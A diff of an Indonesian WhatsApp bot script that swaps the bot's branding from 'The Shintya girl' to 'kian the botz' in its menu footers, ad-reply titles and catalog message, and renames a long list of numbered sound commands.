+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -4896,7 +4802,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
-"description": ` - © © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 -
+"description": ` - © © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 -
 
 ◎ Owner : ${botname}
 ◎ Lib : Multi-Device
@@ -4909,7 +4815,7 @@ SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIB LANJUT ✌️`,
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 WE ARE NOT MASTOD`,
+"retailerId": `© © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 WE ARE NOT MASTOD`,
 "url": "Wa.me/6289514100332"
 },
 "businessOwnerJid": "6289514100332@s.whatsapp.net",
@@ -4935,8 +4841,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤cantik
 ╠➤kesel
 ╠➤ngeselin
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -4971,8 +4877,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤heleh
 ╠➤holoh
 ╠➤delttt]
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5016,8 +4922,8 @@ nomorhoki
 ╠➤masasubur
 ╠➤zodiak
 ╠➤shio
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5035,8 +4941,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤alquran
 ╠➤juzamma
 ╠➤tafsirsurah
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5065,8 +4971,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤antara-news
 ╠➤cnn-news
 ╠➤fajar-news
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱ `,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱ `,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5103,8 +5009,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤getpic
 ╠➤penjara
 ╠➤intro
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5145,7 +5051,7 @@ if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
  *[ 🌷 ] Asupan Mata* 
 bokep`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5165,8 +5071,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤wikimedia [query]
 ╠➤ringtone [query]
 ╠➤searchgroups [query]
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5217,8 +5123,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤listcmd
 ╠➤delcmd
 ╠➤lockcmd
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5234,7 +5140,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Download Menu* 
 pinterestdl [url]
 mediafire [url]`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5306,8 +5212,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤darkjoke
 ╠➤meme
 ╠➤meme2
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
@@ -5322,169 +5228,169 @@ case 'randomsound': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╔══════[ Sound Menu ]══════⊱
-╠➤zensound1
-╠➤zensound2
-╠➤zensound3
-╠➤zensound4
-╠➤zensound5
-╠➤zensound6
-╠➤zensound7
-╠➤zensound8
-╠➤zensound9
-╠➤zensound10
-╠➤zensound11
-╠➤zensound12
-╠➤zensound13
-╠➤zensound14
-╠➤zensound15
-╠➤zensound16
-╠➤zensound17
-╠➤zensound18
-╠➤zensound19
-╠➤zensound20
-╠➤zensound21
-╠➤zensound22
-╠➤zensound23
-╠➤zensound24
-╠➤zensound25
-╠➤zensound26
-╠➤zensound27
-╠➤zensound28
-╠➤zensound29
-╠➤zensound30
-╠➤zensound31
-╠➤zensound32
-╠➤zensound33
-╠➤zensound34
-╠➤zensound35
-╠➤zensound36
-╠➤zensound37
-╠➤zensound38
-╠➤zensound39
-╠➤zensound40
-╠➤zensound41
-╠➤zensound42
-╠➤zensound43
-╠➤zensound44
-╠➤zensound45
-╠➤zensound46
-╠➤zensound47
-╠➤zensound48
-╠➤zensound49
-╠➤zensound50
-╠➤zensound51
-╠➤zensound52
-╠➤zensound53
-╠➤zensound54
-╠➤zensound55
-╠➤zensound56
-╠➤zensound57
-╠➤zensound58
-╠➤zensound59
-╠➤zensound60
-╠➤zensound61
-╠➤zensound62
-╠➤zensound63
-╠➤zensound64
-╠➤zensound65
-╠➤zensound66
-╠➤zensound67
-╠➤zensound68
-╠➤zensound69
-╠➤zensound70
-╠➤zensound71
-╠➤zensound72
-╠➤zensound73
-╠➤zensound74
-╠➤zensound75
-╠➤zensound76
-╠➤zensound77
-╠➤zensound78
-╠➤zensound79
-╠➤zensound80
-╠➤zensound81
-╠➤zensound82
-╠➤zensound83
-╠➤zensound84
-╠➤zensound85
-╠➤zensound86
-╠➤zensound87
-╠➤zensound88
-╠➤zensound89
-╠➤zensound90
-╠➤zensound91
-╠➤zensound92
-╠➤zensound93
-╠➤zensound94
-╠➤zensound95
-╠➤zensound96
-╠➤zensound97
-╠➤zensound98
-╠➤zensound99
-╠➤zensound100
-╠➤zensound101
-╠➤zensound102
-╠➤zensound103
-╠➤zensound104
-╠➤zensound105
-╠➤zensound106
-╠➤zensound107
-╠➤zensound108
-╠➤zensound109
-╠➤zensound110
-╠➤zensound111
-╠➤zensound112
-╠➤zensound113
-╠➤zensound114
-╠➤zensound115
-╠➤zensound116
-╠➤zensound117
-╠➤zensound118
-╠➤zensound119
-╠➤zensound120
-╠➤zensound121
-╠➤zensound122
-╠➤zensound123
-╠➤zensound124
-╠➤zensound125
-╠➤zensound126
-╠➤zensound127
-╠➤zensound128
-╠➤zensound129
-╠➤zensound130
-╠➤zensound131
-╠➤zensound132
-╠➤zensound133
-╠➤zensound134
-╠➤zensound135
-╠➤zensound136
-╠➤zensound137
-╠➤zensound138
-╠➤zensound139
-╠➤zensound140
-╠➤zensound141
-╠➤zensound142
-╠➤zensound143
-╠➤zensound144
-╠➤zensound145
-╠➤zensound146
-╠➤zensound147
-╠➤zensound148
-╠➤zensound149
-╠➤zensound150
-╠➤zensound151
-╠➤zensound152
-╠➤zensound153
-╠➤zensound154
-╠➤zensound155
-╠➤zensound156
-╠➤zensound157
-╠➤zensound158
-╠➤zensound159
-╠➤zensound160
-╠➤zensound161
-╚════[ © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
+╠➤kiansound1
+╠➤kiansound2
+╠➤kiansound3
+╠➤kiansound4
+╠➤kiansound5
+╠➤kiansound6
+╠➤kiansound7
+╠➤kiansound8
+╠➤kiansound9
+╠➤kiansound10
+╠➤kiansound11
+╠➤kiansound12
+╠➤kiansound13
+╠➤kiansound14
+╠➤kiansound15
+╠➤kiansound16
+╠➤kiansound17
+╠➤kiansound18
+╠➤kiansound19
+╠➤kiansound20
+╠➤kiansound21
+╠➤kiansound22
+╠➤kiansound23
+╠➤kiansound24
+╠➤kiansound25
+╠➤kiansound26
+╠➤kiansound27
+╠➤kiansound28
+╠➤kiansound29
+╠➤kiansound30
+╠➤kiansound31
+╠➤kiansound32
+╠➤kiansound33
+╠➤kiansound34
+╠➤kiansound35
+╠➤kiansound36
+╠➤kiansound37
+╠➤kiansound38
+╠➤kiansound39
+╠➤kiansound40
+╠➤kiansound41
+╠➤kiansound42
+╠➤kiansound43
+╠➤kiansound44
+╠➤kiansound45
+╠➤kiansound46
+╠➤kiansound47
+╠➤kiansound48
+╠➤kiansound49
+╠➤kiansound50
+╠➤kiansound51
+╠➤kiansound52
+╠➤kiansound53
+╠➤kiansound54
+╠➤kiansound55
+╠➤kiansound56
+╠➤kiansound57
+╠➤kiansound58
+╠➤kiansound59
+╠➤kiansound60
+╠➤kiansound61
+╠➤kiansound62
+╠➤kiansound63
+╠➤kiansound64
+╠➤kiansound65
+╠➤kiansound66
+╠➤kiansound67
+╠➤kiansound68
+╠➤kiansound69
+╠➤kiansound70
+╠➤kiansound71
+╠➤kiansound72
+╠➤kiansound73
+╠➤kiansound74
+╠➤kiansound75
+╠➤kiansound76
+╠➤kiansound77
+╠➤kiansound78
+╠➤kiansound79
+╠➤kiansound80
+╠➤kiansound81
+╠➤kiansound82
+╠➤kiansound83
+╠➤kiansound84
+╠➤kiansound85
+╠➤kiansound86
+╠➤kiansound87
+╠➤kiansound88
+╠➤kiansound89
+╠➤kiansound90
+╠➤kiansound91
+╠➤kiansound92
+╠➤kiansound93
+╠➤kiansound94
+╠➤kiansound95
+╠➤kiansound96
+╠➤kiansound97
+╠➤kiansound98
+╠➤kiansound99
+╠➤kiansound100
+╠➤kiansound101
+╠➤kiansound102
+╠➤kiansound103
+╠➤kiansound104
+╠➤kiansound105
+╠➤kiansound106
+╠➤kiansound107
+╠➤kiansound108
+╠➤kiansound109
+╠➤kiansound110
+╠➤kiansound111
+╠➤kiansound112
+╠➤kiansound113
+╠➤kiansound114
+╠➤kiansound115
+╠➤kiansound116
+╠➤kiansound117
+╠➤kiansound118
+╠➤kiansound119
+╠➤kiansound120
+╠➤kiansound121
+╠➤kiansound122
+╠➤kiansound123
+╠➤kiansound124
+╠➤kiansound125
+╠➤kiansound126
+╠➤kiansound127
+╠➤kiansound128
+╠➤kiansound129
+╠➤kiansound130
+╠➤kiansound131
+╠➤kiansound132
+╠➤kiansound133
+╠➤kiansound134
+╠➤kiansound135
+╠➤kiansound136
+╠➤kiansound137
+╠➤kiansound138
+╠➤kiansound139
+╠➤kiansound140
+╠➤kiansound141
+╠➤kiansound142
+╠➤kiansound143
+╠➤kiansound144
+╠➤kiansound145
+╠➤kiansound146
+╠➤kiansound147
+╠➤kiansound148
+╠➤kiansound149
+╠➤kiansound150
+╠➤kiansound151
+╠➤kiansound152
+╠➤kiansound153
+╠➤kiansound154
+╠➤kiansound155
+╠➤kiansound156
+╠➤kiansound157
+╠➤kiansound158
+╠➤kiansound159
+╠➤kiansound160
+╠➤kiansound161
+╚════[ © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
